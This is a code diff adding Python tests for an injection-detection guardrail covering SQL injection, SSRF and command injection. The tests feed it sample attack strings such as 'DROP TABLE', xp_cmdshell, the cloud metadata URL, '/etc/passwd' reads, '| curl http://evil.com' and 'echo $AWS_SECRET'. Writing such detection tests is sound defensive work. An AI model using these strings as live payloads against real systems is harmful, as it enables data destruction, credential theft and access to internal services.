@@ -384,3 +384,116 @@ class TestInjectionResultStructure:
         assert result.passed is True
         assert result.action == "allowed"
         assert result.matches == []
+
+
+# -- SQL injection ----------------------------------------------------------
+
+
+class TestInjectionSQL:
+    def test_union_select(self):
+        g = InjectionGuardrail()
+        result = g.check("UNION ALL SELECT username, password FROM users")
+        assert result.passed is False
+        matches = g.detect("UNION SELECT * FROM admin")
+        assert any(m.category == "sql_injection" for m in matches)
+
+    def test_or_true(self):
+        g = InjectionGuardrail()
+        result = g.check("' OR '1'='1")
+        assert result.passed is False
+
+    def test_drop_table(self):
+        g = InjectionGuardrail()
+        result = g.check("'; DROP TABLE users;--")
+        assert result.passed is False
+        matches = g.detect("DROP DATABASE production")
+        assert any(m.category == "sql_injection" for m in matches)
+
+    def test_sleep_blind(self):
+        g = InjectionGuardrail()
+        matches = g.detect("SLEEP(5)")
+        assert any(m.category == "sql_injection" for m in matches)
+
+    def test_stacked_queries(self):
+        g = InjectionGuardrail()
+        matches = g.detect("; EXEC xp_cmdshell('dir')")
+        assert any(m.category == "sql_injection" for m in matches)
+
+    def test_info_schema_medium(self):
+        g = InjectionGuardrail(sensitivity="medium")
+        matches = g.detect("SELECT * FROM INFORMATION_SCHEMA.TABLES")
+        assert any(m.category == "sql_injection" for m in matches)
+
+    def test_clean_sql_keyword(self):
+        g = InjectionGuardrail()
+        result = g.check("Please select the best option for me")
+        assert result.passed is True
+
+
+# -- SSRF attempt -----------------------------------------------------------
+
+
+class TestInjectionSSRF:
+    def test_cloud_metadata(self):
+        g = InjectionGuardrail()
+        result = g.check("http://169.254.169.254/latest/meta-data/")
+        assert result.passed is False
+        matches = g.detect("http://169.254.169.254/latest/meta-data/")
+        assert any(m.category == "ssrf_attempt" for m in matches)
+
+    def test_localhost(self):
+        g = InjectionGuardrail()
+        matches = g.detect("http://127.0.0.1:8080/admin")
+        assert any(m.category == "ssrf_attempt" for m in matches)
+
+    def test_internal_ip_10(self):
+        g = InjectionGuardrail()
+        matches = g.detect("http://10.0.0.1/internal")
+        assert any(m.category == "ssrf_attempt" for m in matches)
+
+    def test_file_protocol(self):
+        g = InjectionGuardrail()
+        matches = g.detect("file:///etc/passwd")
+        assert any(m.category == "ssrf_attempt" for m in matches)
+
+    def test_clean_url(self):
+        g = InjectionGuardrail()
+        result = g.check("Visit https://example.com for details")
+        assert result.passed is True
+
+
+# -- Command injection ------------------------------------------------------
+
+
+class TestInjectionCommand:
+    def test_shell_chain(self):
+        g = InjectionGuardrail()
+        result = g.check("; cat /etc/passwd")
+        assert result.passed is False
+        matches = g.detect("| curl http://evil.com")
+        assert any(m.category == "command_injection" for m in matches)
+
+    def test_subshell(self):
+        g = InjectionGuardrail()
+        matches = g.detect("$(whoami)")
+        assert any(m.category == "command_injection" for m in matches)
+
+    def test_path_traversal(self):
+        g = InjectionGuardrail()
+        matches = g.detect("../../../etc/passwd")
+        assert any(m.category == "command_injection" for m in matches)
+
+    def test_null_byte(self):
+        g = InjectionGuardrail()
+        matches = g.detect("file.txt%00.jpg")
+        assert any(m.category == "command_injection" for m in matches)
+
+    def test_env_exfil_medium(self):
+        g = InjectionGuardrail(sensitivity="medium")
+        matches = g.detect("echo $AWS_SECRET")
+        assert any(m.category == "command_injection" for m in matches)
+
+    def test_clean_path(self):
+        g = InjectionGuardrail()
+        result = g.check("The file is at /home/user/docs/report.pdf")
+        assert result.passed is True
